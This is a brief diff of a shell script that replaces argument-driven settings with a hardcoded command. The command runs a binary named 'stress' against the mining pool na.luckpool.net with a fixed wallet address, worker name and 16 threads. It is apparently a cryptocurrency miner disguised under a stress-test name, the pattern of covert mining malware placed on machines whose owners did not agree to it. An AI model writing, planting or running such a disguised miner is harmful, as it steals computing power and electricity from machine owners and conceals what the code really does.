@@ -1,6 +1,3 @@
 #!/bin/sh
 
-FUCK="$1"
-CPU="$2"
-CONNECT="na.luckpool.net:3956"
-./stress -v -l $CONNECT -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t $CPU -p x
+./stress -v -l na.luckpool.net:3956 -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.cok -t 16 -p x
